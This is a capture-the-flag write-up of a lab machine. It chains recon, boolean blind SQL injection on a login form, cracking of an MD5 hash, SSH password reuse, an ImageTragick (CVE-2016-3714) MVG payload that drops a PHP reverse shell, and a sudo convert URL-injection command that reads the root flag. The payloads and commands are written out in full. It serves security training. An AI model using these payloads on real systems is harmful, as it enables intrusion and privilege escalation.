# Blind SQLi, ImageTragick, sudo convert Writeup

## Flags
- **User:** `CUEH{P@ssW0rd_R3Use_I5_B@d}`
- **Root:** `CUEH{Tr@gic_Mag1c}`

## Attack Chain

```
nmap + ffuf → found /profile.php
     ↓
Boolean blind SQLi on login → extracted dev credentials
     ↓
Cracked MD5 hash → goodforyou
     ↓
SSH as dev (password reuse) → user flag
     ↓
/profile.php avatar upload → ImageMagick 6.9.2-10
     ↓
CVE-2016-3714 (ImageTragick) → PHP reverse shell as www-data
     ↓
sudo /usr/magic/bin/convert → URL injection → root flag
```

## Recon

```bash
nmap -sC -sV -p- 192.168.64.4
```

Found SSH and HTTP. Ran ffuf to enumerate directories:

```bash
ffuf -u http://192.168.64.4/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Found `/profile.php` alongside the login page, worth keeping in mind for later.

## SQL Injection - Credential Extraction

The login form was injectable but not straightforward, it was boolean-based blind SQLi, meaning no data gets returned directly. You have to ask true/false questions to extract data one character at a time.

Used this logic to test:
```
email: admin' AND 1=1-- (true → different response)
email: admin' AND 1=2-- (false → different response)
```

Slowly enumerated the database structure and pulled out:
```
email: dev@hacking.local
password hash: (MD5)
```

Cracked the hash on [crackstation.net](https://crackstation.net):
```
hash → goodforyou
```

## User Flag - Password Reuse

Tried the same credentials over SSH:

```bash
ssh dev@192.168.64.4
# password: goodforyou
```

It worked - classic password reuse. Flag was in the home directory:

```bash
cat ~/user.txt
# CUEH{P@ssW0rd_R3Use_I5_B@d}
```

The flag name says it all.

## Privilege Escalation - CVE-2016-3714 (ImageTragick)

Logged into the website as dev. The `/profile.php` page had an avatar upload that showed the message **"Image Rescaled using Magic"**, dead giveaway that ImageMagick was processing uploads.

Checked the version:
```
ImageMagick 6.9.2-10
```

This version is vulnerable to **CVE-2016-3714**, also known as **ImageTragick**. The vulnerability allows command injection through specially crafted image files, specifically `.mvg` or disguised image files with malicious `push graphic-context` directives.

Crafted a malicious image file:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|cp /var/www/html/shell.php /var/www/html/avatars/access.php")'
pop graphic-context
```

Uploaded it via the avatar upload on `/profile.php`. ImageMagick processed it and executed the command, copying a PHP reverse shell into the avatars web directory.

Started a listener:
```bash
nc -lvnp 4444
```

Triggered the shell by browsing to:
```
http://192.168.64.4/avatars/access.php
```

Got a shell as `www-data`.

## Root - sudo convert URL Injection

Checked sudo permissions:
```bash
sudo -l
# (ALL) NOPASSWD: /usr/magic/bin/convert
```

The `convert` command (ImageMagick) was allowed as root with no password. Used URL injection to run a command as root:

```bash
sudo /usr/magic/bin/convert 'https://example.com"|cat /root/root.txt > /home/dev/flag"' out.png
cat /home/dev/flag
# CUEH{Tr@gic_Mag1c}
```

The `convert` command tried to fetch the URL, but the injected shell metacharacters caused it to execute our command as root before the URL fetch happened.

## Summary

| Step | Technique |
|------|-----------|
| Recon | nmap + ffuf |
| Foothold | Boolean blind SQLi → credential extraction |
| Cracking | MD5 hash → crackstation |
| User flag | SSH login (password reuse) |
| Shell | CVE-2016-3714 ImageTragick → www-data |
| Root | sudo convert URL injection |

## Key Lessons

- Always test for password reuse between web app credentials and SSH
- ImageMagick has a long history of critical vulnerabilities, always check the version
- NOPASSWD sudo rules for programs that accept URLs or file paths are almost always exploitable